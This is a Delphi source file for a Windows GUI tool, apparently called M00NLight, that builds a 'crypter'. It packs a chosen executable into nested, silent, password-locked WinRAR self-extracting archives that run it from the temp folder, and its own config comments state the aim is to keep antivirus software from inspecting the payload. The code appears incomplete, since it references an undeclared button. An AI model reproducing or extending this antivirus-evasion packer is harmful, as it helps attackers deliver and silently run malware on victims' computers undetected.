unit MoonUnit;



interface

uses
  Windows,Classes, dprocess, SysUtils, Forms, Controls, Graphics, Dialogs, ExtCtrls,
  StdCtrls,  Shlobj, Vcl.ComCtrls, Vcl.Menus, system.IOUtils;

type

  { TMoonForm }

  TMainform = class(TForm)
    SourceLBL: TLabel;
    SourceEDT: TEdit;
    LoadBTN1: TButton;
    RARLBL: TLabel;
    RAREDT: TEdit;
    LoadBTN2: TButton;
    StubLBL: TLabel;
    StubEDT: TEdit;
    LoadBTN3: TButton;
    SaveLBL: TLabel;
    SaveEDT: TEdit;
    SaveBTN: TButton;
    BTNGerar: TButton;
    ProgressBar: TProgressBar;
    OpenDialog1: TOpenDialog;
    SaveDialog1: TSaveDialog;
    WinDialog1: TOpenDialog;
    PopupMenu1: TPopupMenu;
    procedure BTNGerarClick(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure LoadBTN1Click(Sender: TObject);
    procedure LoadBTN2Click(Sender: TObject);
    procedure LoadBTN3Click(Sender: TObject);
    procedure SaveBTNClick(Sender: TObject);
  private
    { private declarations }
  public
    { public declarations }
  end;

var
  Mainform: TMainform;
  Master: TProcess;
  FFile: Text;
  Pass: String;

implementation

{$R *.dfm}

{ TMoonForm }

function RandomStr(PLen: Integer; Dict: String): string;
var
  str: string;
begin
  str    := Dict;
  Result := '';
  repeat
    Result := Result + str[Random(Length(str)) + 1];
  until (Length(Result) = PLen)
end;

procedure TMainform.FormActivate(Sender: TObject);
begin
  Randomize;
  Pass:=RandomStr(8,'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890');
  SaveEDT.Text:=ExtractFilePath(Application.ExeName)+'Moon.exe';
  if FileExists('C:\Program Files\WinRAR\Rar.exe') then RAREDT.Text:='C:\Program Files\WinRAR\Rar.exe' else
    ShowMessage('RAR Module not found! Please select it manually!');
end;

function GetCMDPath(Folder: Integer; CanCreate: Boolean): string;
var
   FilePath: array [0..255] of char;
begin
 SHGetSpecialFolderPath(0, @FilePath[0], FOLDER, CanCreate);
 Result := FilePath+'\cmd.exe';
end;

procedure ChDel(FileToDel: String);
Begin
 if FileExists(FileToDel) then DeleteFile(FileToDel);
end;

procedure CleanUp;
Begin
  ChDel('Moon.exe');
  ChDel('Sources.exe');
  ChDel('FixTool.bat');
  ChDel('SFXConfig.cfg');
  with Mainform do Begin
  ChDel(ExtractFileName(SourceEDT.Text));
  ChDel(ExtractFileName(SaveEDT.Text));
  end;
end;

procedure DisableComponents;
Begin
 with Mainform Do Begin
   CryptBTN.Enabled:=False;
   LoadBTN1.Enabled:=False;
   LoadBTN2.Enabled:=False;
   LoadBTN3.Enabled:=False;
   SaveBTN.Enabled:=False;
   SourceEDT.Enabled:=False;
   RAREDT.Enabled:=False;
   SaveEDT.Enabled:=False;
 end;
end;

procedure Step;
Begin
 with Mainform do ProgressBar.Position:=ProgressBar.Position+10;
end;

procedure EnableComponents;
Begin
 with Mainform Do Begin
   CryptBTN.Enabled:=True;
   LoadBTN1.Enabled:=True;
   LoadBTN2.Enabled:=True;
   LoadBTN3.Enabled:=True;
   SaveBTN.Enabled:=True;
   SourceEDT.Enabled:=True;
   RAREDT.Enabled:=True;
   SaveEDT.Enabled:=True;
 end;
end;

procedure TMainform.BTNGerarClick(Sender: TObject);
begin
 DisableComponents;
  if (FileExists(RAREDT.Text)) and (FileExists(SourceEDT.Text)) then Begin
    CleanUp;
    Step;
    AssignFile(FFile,'SFXConfig.cfg');
    Rewrite(FFile);
    Writeln(FFile,';This file contains SFX instructions.');
    Writeln(FFile,';These are used to compress the source');
    Writeln(FFile,';And lock it, so AVs can''t access it.');
    Writeln(FFile);
    Writeln(FFile,'Path=%temp%');
    Writeln(FFile,'SavePath');
    Writeln(FFile,'Setup='+ExtractFileName(SourceEDT.Text));
    Writeln(FFile,'TempMode');
    Writeln(FFile,'Silent=1');
    Writeln(FFile,'Overwrite=1');
    Writeln(FFile,'Title=M00NLight');
    CloseFile(FFile);
    Step;
    if CopyFile(PWideChar(SourceEDT.Text),PWideChar(ExtractFilePath(ParamStr(0))+ExtractFileName(SourceEDT.Text)),true) then Begin
      Master:=TProcess.Create(nil);
      Master.Executable:=RAREDT.Text;
      Master.ShowWindow:=swoHIDE;
      Master.Options:=[];
      Master.CurrentDirectory:=ExtractFileDir(Application.ExeName);
      Master.Parameters.Add('a -cfg -k -m5 -p"'+Pass+'" -sfx -z"'+ExtractFilePath(Application.ExeName)+'SFXConfig.cfg" "Sources" "'+ExtractFileName(SourceEDT.Text)+'"');
      Master.Execute;
      Repeat
        Application.ProcessMessages;
        Mainform.Update;
      until Not(Master.Running);
      Master.Free;
      Step;
      Step;
      AssignFile(FFile,'FixTool.bat');
      Rewrite(FFile);
      Writeln(FFile,'Sources.exe -p"'+Pass+'"');
      CloseFile(FFile);
      Step;
      AssignFile(FFile,'SFXConfig.cfg');
      Rewrite(FFile);
      Writeln(FFile,';This file contains SFX instructions.');
      Writeln(FFile,';These are used to compress the source.');
      Writeln(FFile);
      Writeln(FFile,'Path=%temp%');
      Writeln(FFile,'SavePath');
      Writeln(FFile,'Setup=FixTool.bat');
      Writeln(FFile,'TempMode');
      Writeln(FFile,'Silent=1');
      Writeln(FFile,'Overwrite=1');
      Writeln(FFile,'Title=M00NLight');
      CloseFile(FFile);
      Step;
      Master:=TProcess.Create(nil);
      Master.Executable:=RAREDT.Text;
      Master.ShowWindow:=swoHIDE;
      Master.Options:=[];
      Master.CurrentDirectory:=ExtractFileDir(Application.ExeName);
      Master.Parameters.Add('a -cfg -m5 -sfx -z"'+ExtractFilePath(Application.ExeName)+'SFXConfig.cfg" "'+ExtractFileName(SaveEDT.Text)+'" "Sources.exe" "FixTool.bat"');
      Master.Execute;
      Repeat
        Application.ProcessMessages;
        Mainform.Update;
      until Not(Master.Running);
      Master.Free;
      Step;
      Step;
     // CopyFile(PWideChar(ExtractFileName(SaveEDT.Text)),PWideChar(SaveEDT.Text),true);
      Step;
      ShowMessage('Crypting successful!');
    end;
  end else ShowMessage('Invalid input!');
  CleanUp;
  Step;
  ProgressBar.Position:=0;
  EnableComponents;
end;

procedure TMainform.LoadBTN1Click(Sender: TObject);
begin
  if OpenDialog1.Execute then
  if FileExists(OpenDialog1.FileName) then Begin
    SourceEDT.Text:=OpenDialog1.FileName;
  end;
  OpenDialog1.FileName:='';
end;

procedure TMainform.LoadBTN2Click(Sender: TObject);
begin
  if WinDialog1.Execute then
  if (FileExists(WinDialog1.FileName)) and (Pos('Rar.exe',WinDialog1.FileName)>0) then Begin
    RAREDT.Text:=WinDialog1.FileName;
  end;
  WinDialog1.FileName:='';
end;

procedure TMainform.LoadBTN3Click(Sender: TObject);
begin
  ShowMessage('Stubs are not yet implemented!');
end;

procedure TMainform.SaveBTNClick(Sender: TObject);
begin
  if SaveDialog1.Execute then
    SaveEDT.Text:=SaveDialog1.FileName;
  SaveDialog1.FileName:='';
end;

end.

